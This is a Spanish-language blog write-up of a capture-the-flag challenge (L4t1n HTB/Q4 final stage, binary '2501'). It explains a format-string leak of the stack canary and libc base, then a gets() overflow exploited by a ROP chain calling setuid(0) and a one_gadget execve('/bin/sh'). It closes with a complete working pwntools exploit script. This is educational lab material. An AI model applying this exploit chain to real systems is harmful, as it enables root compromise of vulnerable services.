@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>writeup, Desafio L4t1n HTB (parte final, 2501) | Your awesome title</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="writeup, Desafio L4t1n HTB (parte final, 2501)" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hola acá les dejo el writeup/solución del desafío que publicamos con l4t1n HTB y Q4, El desafío consistía de una parte web, un crypto y luego este, un binario que permitía escalar a root, entregando la flag final. El binario lo pueden descargar de acá" />
+<meta property="og:description" content="Hola acá les dejo el writeup/solución del desafío que publicamos con l4t1n HTB y Q4, El desafío consistía de una parte web, un crypto y luego este, un binario que permitía escalar a root, entregando la flag final. El binario lo pueden descargar de acá" />
+<link rel="canonical" href="http://localhost:4000/aslr/byapss/canary/format%20string/hack%20the%20box/htb/memory%20leak/overflow/q4/rop/sin%20categor%C3%ADa/writeup/2019/10/06/writeup-desafio-l4t1n-htb-parte-final-2501.html" />
+<meta property="og:url" content="http://localhost:4000/aslr/byapss/canary/format%20string/hack%20the%20box/htb/memory%20leak/overflow/q4/rop/sin%20categor%C3%ADa/writeup/2019/10/06/writeup-desafio-l4t1n-htb-parte-final-2501.html" />
+<meta property="og:site_name" content="Your awesome title" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-10-06T00:10:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="writeup, Desafio L4t1n HTB (parte final, 2501)" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"http://localhost:4000/aslr/byapss/canary/format%20string/hack%20the%20box/htb/memory%20leak/overflow/q4/rop/sin%20categor%C3%ADa/writeup/2019/10/06/writeup-desafio-l4t1n-htb-parte-final-2501.html","headline":"writeup, Desafio L4t1n HTB (parte final, 2501)","dateModified":"2019-10-06T00:10:00-03:00","datePublished":"2019-10-06T00:10:00-03:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/aslr/byapss/canary/format%20string/hack%20the%20box/htb/memory%20leak/overflow/q4/rop/sin%20categor%C3%ADa/writeup/2019/10/06/writeup-desafio-l4t1n-htb-parte-final-2501.html"},"description":"Hola acá les dejo el writeup/solución del desafío que publicamos con l4t1n HTB y Q4, El desafío consistía de una parte web, un crypto y luego este, un binario que permitía escalar a root, entregando la flag final. El binario lo pueden descargar de acá","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Your awesome title" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Your awesome title</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">writeup, Desafio L4t1n HTB (parte final, 2501)</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2019-10-06T00:10:00-03:00" itemprop="datePublished">Oct 6, 2019
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <!-- wp:paragraph -->
+<p>Hola acá les dejo el writeup/solución del desafío que publicamos con l4t1n HTB y Q4, El desafío consistía de una parte web, un crypto y luego este, un binario que permitía escalar a root, entregando la flag final. El binario lo pueden descargar de acá</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Como dato para correr el binario remoto y escalar en sus maquinas locales, deben ejecutar como root el binario de la siguiente forma</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><strong>socat tcp-listen:5555,reuseaddr,fork, exec:"./2501"</strong></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><a href="https://github.com/dplastico/desafio_2501">https://github.com/dplastico/desafio_2501</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Luego de reconocimiento nos encontramos con un archivo llamado 2501 el cual después de analizar y previa enumeración nos damos cuenta es el mismo que esta corriendo como root en el puerto 5555</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>El programa simplemente pide un nombre y luego un código el cual devuelve  nuestro "input"... mmm...  Que podrá significar esto…</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":138} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture1.png" alt="" class="wp-image-138" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Dado que tenemos
+el mismo binario procedemos a analizarlo podemos ver que tiene activada las
+protecciones PIE, NX y CANARY (observamos algunas herramientas útiles como
+pwntools instaladas)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":139} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture2.png" alt="" class="wp-image-139" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Y además es un ELF 64 bits dinámicamente “linkeado” por lo que ocupa librerías de libc</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":161,"width":688,"height":51} -->
+<figure class="wp-block-image is-resized"><img src="/wp-content/uploads/2019/10/image-1024x77.png" alt="" class="wp-image-161" width="688" height="51" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Analicemos el binario y sus funciones podemos descargarlo para mayor conveniencia luego deberemos ejecutarlo remoto (para esto ocuparé Hopper)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Observamos que
+lee la variable var_50 desde un input y luego la imprime!</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":141} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture4.png" alt="" class="wp-image-141" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Esto Parece un format string, probémoslo</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><a href="https://es.wikipedia.org/wiki/Format_String_Attack">https://es.wikipedia.org/wiki/Format_String_Attack</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":142} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture5.png" alt="" class="wp-image-142" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Efectivamente
+tenemos un memory leak! Antes de aprovecharnos de el sigamos revisando el
+binario</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Vemos que la función center la cual nos lleva el flujo del binario tiene un clásico overflow via GETS </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><a href="https://linux.die.net/man/3/gets">https://linux.die.net/man/3/gets</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":143} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture6.png" alt="" class="wp-image-143" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ok, Tenemos
+ASLR en el sistema y el binario esta con la protección PIE por lo que debemos
+encontrar una forma de generar un “leak” de alguna dirección en libc, calcular
+el offset a la dirección base y de esta forma poder realizar un buffer overflow
+con ret2libc, pero dado que no tenemos una llamada a system, será mejor probar con
+ROP ya que el stack no es ejecutable, por lo que un shellcode no servirá pero
+tenemos algunos problemas, primero tenemos que ver como bypasear la protección
+de stack cookies, o CANARY</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><a href="https://access.redhat.com/blogs/766093/posts/3548631">Acá&nbsp;tenemos</a> una explicación de que es la protección CANARY Y <a href="https://es.wikipedia.org/wiki/Aleatoriedad_en_la_disposici%C3%B3n_del_espacio_de_direcciones">ASLR</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Para lograr
+esto en 32 bit podríamos intentar hacer un “brute force” a la dirección de
+canary, pero dado que nos encontramos en 64 bit esto no parece posible (serian
+mas de 16^7 direcciones, algo más de 260 millones)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Pero tenemos un format string! Será que podemos hacer un “leak” de esta dirección? Veamos que podemos ver en gdb, para eso debemos frenar la ejecución luego de ingresar nuestro bof, veamos:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Primero nos
+encargamos de filtrar las direcciones en un formato reconocible para eso las
+ponemos separadas por guiones y en formato mas legible</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":144} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture7.png" alt="" class="wp-image-144" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Veamos si
+alguna de estas direcciones puede servirnos, avanzamos en el programa en busca
+del chequeo del canary, pegamos nuestro breakpoint en la función center (con el
+bof) y continuamos</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Haciendo un
+disassembly podemos ver que al registro RAX se le asigna un valor y luego se
+hace XOR que al compararse, si falla nos redirige a stack_chk_fail</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":145} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture8.png" alt="" class="wp-image-145" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Veamos si
+podemos encontrar el valor de RAX en nuestro leak luego de esta misma operación
+y que corresponde al valor del “leak” numero 15 después de “Hello”</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":146} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture9.png" alt="" class="wp-image-146" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Bueno y ahora? No sabemos en que offset está nuestro canary ni donde nuestra dirección de retorno, así que llego la hora de scriptear!, armemos un skeleton script en Python con pwntools ya que están en el server. Con mi config de gef creo un script fácil que ya tengo pre-seteado con el cual solo necesito crear la función exploit (mas info sobre GEF acá <a href="https://github.com/hugsy/gef">https://github.com/hugsy/gef</a>)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":147} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture10.png" alt="" class="wp-image-147" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>pero creare dos
+funciones, primero una para calcular el offset del canary, aprovechándonos del
+mensaje de “stack smashing detected”:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":148} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture11.png" alt="" class="wp-image-148" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Con esto
+podemos calcular el offset del canary el cual se encuentra en a 136 caracteres
+de input, con esto procedemos a calcular el offset a la dirección de retorno,
+podemos crear una pequeña función</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":149} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture12.png" alt="" class="wp-image-149" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>OK con esto
+calculamos que la dirección de retorno se encuentra 8 bytes luego del CANARY,
+así que ahora ya podemos comenzar a construir la llamada a nuestra Shell. Pero
+tenemos PIE, como lograrlo?</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Debemos
+calcular el offset de alguna dirección de libc, esta vez podemos ver que las
+primeras direcciones parecen ser de libc, por lo que veamos si se cargan en
+algun registro que nos permita hacer el cálculo:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Generamos un
+leak:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":150,"width":870,"height":77} -->
+<figure class="wp-block-image is-resized"><img src="/wp-content/uploads/2019/10/Picture13.png" alt="" class="wp-image-150" width="870" height="77" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Y observamos
+los registros (info reg)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":151} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture14.png" alt="" class="wp-image-151" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Vemos como el
+cuarto valor se asigna al registro R8, si esta dirección es de libc siempre
+podremos saber el offset para calcular la dirección base de libc!</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Observamos la dirección de libc base (info proc map)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":153} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture15.png" alt="" class="wp-image-153" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Excelente así que
+ahora podemos calcular el offset</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":154} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture16-1.png" alt="" class="wp-image-154" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Genial tenemos el
+offset para calcular libc </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Ya podemos
+empezar a armar nuestro exploit! Tenemos varias posibilidades, pero para esta
+vez usare una técnica, que aprendí hace poco, Construiremos nuestro exploit de
+la siguiente forma</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>JUNK + CANARY
++JUNK(hasta ret) + poprdi(en libc)+NULL(para setuid) + SETUID(en libc) +
+GADGET(execve(“/bin/sh”))</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Para buscar un
+pop rdi ret usamos ropper</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":155} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture17.png" alt="" class="wp-image-155" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Para buscar
+setuid usamos pwntools y luego buscamos nuestro gadget, esta vez usaremos la
+herramienta one_gadget (vaya que es útil) para buscar un execve(“/bin/sh”)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":156} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture18.png" alt="" class="wp-image-156" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ahora armemos
+todo junto</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":157} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture19.png" alt="" class="wp-image-157" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Listo A ejecutar
+remoto!</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":158} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2019/10/Picture20.png" alt="" class="wp-image-158" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Desafio concluido! espero les haya gustado :)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Exploit final:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>#!/usr/bin/env python2
+import sys
+from pwn import *
+context.update(arch="amd64", endian="little", os="linux",
+               terminal=["gnome-terminal", "new window"],)
+LOCAL, REMOTE = False, False
+TARGET=os.path.realpath("2501")
+e = ELF(TARGET)
+l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+#ejecutar python exploit.py remote (para tomar el proceso en escucha)
+#la cuarta direccion que se lekea nos da un offset para calcular libc base
+#&gt;&gt;&gt; offset = 0x7ffff7ff2440 - 0x7ffff7a3a000
+#&gt;&gt;&gt; print hex(offset)
+#0x5b8440
+#&gt;&gt;&gt; 
+offset = 0x1c2500 # de R9 que parece estar en libc
+#calculamos este gadget con one_gadget (vaya herramienta)
+gadget = 0x4484f   #excev(/bin/sh)
+setuid = l.symbols['setuid'] # no necesita explicacion
+pop_rdi = 0x23a5f #pop rdi ret en libc (por que no?)
+
+#funcion para calcular el canary... no mucho que explicar
+def offset_canary(): 
+    for i in range(1, 200):
+        r = process([TARGET,])
+        test = "aaa"
+        pattern = "A" * i
+        r.sendlineafter("Name: ", test)
+        r.readuntil('Code:')
+        r.sendline(pattern)
+        response = r.recvall()
+        
+        if "stack smashing detected" in response:
+            print "CANARY empieza en ", i
+            r.close()
+            break
+        else:
+            print "NAAAAAA siga particopando "
+            r.close()
+
+#con esta funcion descrubrimos el offset en canary + 8 bytes (cae en RSP)
+def offset_ret(r):
+    #r = process([TARGET,])
+    test = "%lx-" * 15
+    r.sendlineafter("Name: ", test)
+    response = r.readuntil('Code:')
+    response = response.split('-')
+    canary = int(response[-2],16)
+    print hex(canary)
+    pattern = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII" #encontrado 8 mas (donde empiezan las C)
+    payload = "A" * 136 + p64(canary) + pattern
+
+    r.sendline(payload)
+    #resp = r.recvall()
+    r.interactive()
+
+def exploit(r):
+    payload = "%lx-" * 15
+    r.sendlineafter("Name: ", payload)
+    response = r.readuntil('Code:')
+    response = response.split('-')
+    print "format strings shits : ", response
+    canary = int(response[-2],16)
+    print hex(canary)
+    libc = int(response[3],16) - offset
+    print hex(libc)
+    payload = "A" * 136
+    payload += p64(canary)
+    payload += "B" * 8 #junk hasta ret 
+    payload += p64(libc + pop_rdi)
+    payload += p64(0x0)  #null para setuid
+    payload += p64(libc + setuid) #si vamos a usar esta tecnica ojo con la prueba local
+    payload += p64(libc + gadget) #super gadget
+    r.sendline(payload)
+    r.interactive()
+    return
+
+if __name__ == "__main__":
+    if len(sys.argv)==2 and sys.argv[1]=="remote":
+        REMOTE = True
+        r = remote("127.0.0.1", 5555)
+    else:
+        LOCAL = True
+        r = process([TARGET,])
+        print "PID para debug"
+    print util.proc.pidof(r) #solo para atachar a GDB soy flojo
+        #pause() #ermm
+    exploit(r)
+    #offset_canary()
+   #offset_ret(r)
+    sys.exit(0)
+</code></pre>
+<!-- /wp:code -->
+
+  </div><a class="u-url" href="/aslr/byapss/canary/format%20string/hack%20the%20box/htb/memory%20leak/overflow/q4/rop/sin%20categor%C3%ADa/writeup/2019/10/06/writeup-desafio-l4t1n-htb-parte-final-2501.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Your awesome title</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Your awesome title</li><li><a class="u-email" href="mailto:your-email@example.com">your-email@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
